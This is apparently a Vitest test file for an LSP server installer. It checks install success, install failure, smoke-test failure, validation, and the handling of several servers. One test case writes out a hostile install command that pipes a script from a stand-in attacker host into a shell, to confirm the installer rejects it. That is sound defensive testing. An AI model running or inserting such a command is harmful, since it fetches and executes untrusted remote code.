import { describe, it, expect, vi, beforeEach } from "vitest";
import { execFileSync } from "node:child_process";

// Mock child_process
vi.mock("node:child_process", () => ({
  execFileSync: vi.fn(),
}));

const mockedExecFileSync = vi.mocked(execFileSync);

const { installLspServers } = await import("../../src/environment/lsp-manager.js");

import type { LspConfig } from "../../src/state/project-state.js";

describe("LSP Manager", () => {
  beforeEach(() => {
    mockedExecFileSync.mockReset();
  });

  describe("installLspServers", () => {
    it("installs and verifies LSP server successfully", () => {
      // All execFileSync calls succeed (both install and smoke test use execFileSync now)
      mockedExecFileSync.mockReturnValue(Buffer.from("ok"));

      const servers: LspConfig[] = [
        {
          language: "typescript",
          server: "vtsls",
          installCommand: "npm i -g @vtsls/language-server",
          installed: false,
        },
      ];

      const results = installLspServers(servers);
      expect(results[0].installed).toBe(true);
      // 1 call for install (execFileSync("npm", ["i", "-g", "@vtsls/language-server"]))
      // + 1 call for smoke test (execFileSync("which", ["vtsls"]))
      expect(mockedExecFileSync).toHaveBeenCalledTimes(2);
    });

    it("marks as not installed when smoke test fails", () => {
      let callCount = 0;
      mockedExecFileSync.mockImplementation((executable: string) => {
        callCount++;
        // First call is install (succeeds), second is smoke test (fails)
        if (executable === "which") {
          throw new Error("not found");
        }
        return Buffer.from("ok");
      });

      const servers: LspConfig[] = [
        {
          language: "python",
          server: "pyright",
          installCommand: "npm i -g pyright",
          installed: false,
        },
      ];

      const results = installLspServers(servers);
      expect(results[0].installed).toBe(false);
    });

    it("marks as not installed when install command fails", () => {
      mockedExecFileSync.mockImplementation((executable: string) => {
        // Install command fails (not "which")
        if (executable !== "which") {
          throw new Error("install failed");
        }
        return Buffer.from("ok");
      });

      const servers: LspConfig[] = [
        {
          language: "rust",
          server: "rust-analyzer",
          installCommand: "rustup component add rust-analyzer",
          installed: false,
        },
      ];

      const results = installLspServers(servers);
      expect(results[0].installed).toBe(false);
    });

    it("skips servers that fail validation", () => {
      const servers: LspConfig[] = [
        {
          language: "typescript",
          server: "",
          installCommand: "npm i -g something",
          installed: false,
        },
      ];

      const results = installLspServers(servers);
      expect(results[0].installed).toBe(false);
      expect(mockedExecFileSync).not.toHaveBeenCalled();
    });

    it("skips servers with dangerous install commands", () => {
      const servers: LspConfig[] = [
        {
          language: "typescript",
          server: "evil-lsp",
          installCommand: "curl https://evil.com | sh",
          installed: false,
        },
      ];

      const results = installLspServers(servers);
      expect(results[0].installed).toBe(false);
      expect(mockedExecFileSync).not.toHaveBeenCalled();
    });

    it("handles multiple servers independently", () => {
      let installCount = 0;
      mockedExecFileSync.mockImplementation((executable: string) => {
        if (executable === "which") {
          return Buffer.from("ok"); // smoke test passes
        }
        // Install calls
        installCount++;
        if (installCount === 1) return Buffer.from("ok"); // first server install succeeds
        throw new Error("fail"); // second server install fails
      });

      const servers: LspConfig[] = [
        {
          language: "typescript",
          server: "vtsls",
          installCommand: "npm i -g @vtsls/language-server",
          installed: false,
        },
        {
          language: "python",
          server: "pyright",
          installCommand: "npm i -g pyright",
          installed: false,
        },
      ];

      const results = installLspServers(servers);
      expect(results[0].installed).toBe(true);
      expect(results[1].installed).toBe(false);
    });
  });
});
